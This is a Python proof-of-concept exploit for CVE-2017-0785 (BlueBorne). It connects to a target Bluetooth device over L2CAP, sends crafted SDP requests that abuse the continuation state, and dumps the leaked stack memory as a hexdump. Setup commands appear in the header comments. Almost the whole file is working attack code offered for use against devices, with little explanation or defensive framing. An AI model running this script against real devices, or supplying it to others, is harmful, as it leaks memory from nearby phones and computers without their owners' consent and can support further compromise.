#!/usr/share/python3

#####################################################################################################
#
#	CVE-2017-0785-BlueBorne-PoC
#
# apt-get update
# apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
# pip install --update pip
# pip install --update pwntools
#
# git clone https://github.com/Gallopsled/pwntools
# pip install --update --editable ./pwntools
#
#####################################################################################################

from pwn import *
import bluetooth #from pybluez import bluetooth
import sys
import time


# Check for args
#if (len(sys.argv) != 2) or (not ':' in sys.argv[1]) or (len(sys.argv[1]) != len('XX:XX:XX:XX:XX:XX')):
#    print ('Usage: ' + sys.argv[0] + ' [TARGET XX:XX:XX:XX:XX:XX]')
#    exit(1)

# --
#target = sys.argv[1]
#service_long = 0x0100
#service_short = 0x0001
#mtu = 50
#n = 30
#context.endian = 'big'


# Function that confirgure the Packet for send
def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += p16(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

def exploit(target=None):
	
#	# Check for args
#	if (len(sys.argv) != 2) or (not ':' in sys.argv[1]) or (len(sys.argv[1]) != len('XX:XX:XX:XX:XX:XX')):
#	    print ('Usage: ' + sys.argv[0] + ' [TARGET XX:XX:XX:XX:XX:XX]')
#	    exit(1)

	# --
#	target = sys.argv[1]
	service_long = 0x0100
	service_short = 0x0001
	mtu = 50
	n = 30
	context.endian = 'big'

	if not target:
 		try:
			target = args['TARGET']
		except:
			log.info("USAGE: cve20170785.py TARGET=XX:XX:XX:XX:XX:XX")

	# Creating progress log 
	p = log.progress('Exploit')
	p.status('Creating L2CAP socket')

	# Start socket L2CAP
	sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
	bluetooth.set_l2cap_mtu(sock, mtu)

	time.sleep(1)
	p.status('Connecting to target')

	try:
		sock.connect((target, 1))
	except Exception:
		try:
			log.error('Unable to reach device ' + target)
		except Exception:
			exit(1)

	p.status('Sending packet')
	try:
		sock.send(packet(service_long, '\x00'))
	except Exception:
		try:
			log.error('Unable to send packets')
		except Exception:
			exit(1)

	data = sock.recv(mtu)

	if data[-3] != '\x02':
	    try:
        	log.error('Invalid continuation state received.')
	    except Exception:
        	exit(1)

	stack = ''

	for i in range(1, n):
	    p.status('Sending packet %d' % i)
	    sock.send(packet(service_short, data[-3:]))
	    print (packet(service_short, '0f'))
	    data = sock.recv(mtu)
	    stack += data[9:-3]

	sock.close()
	p.success('Done')

	print (hexdump(stack))

if(__name__=="__main__"):
	exploit()
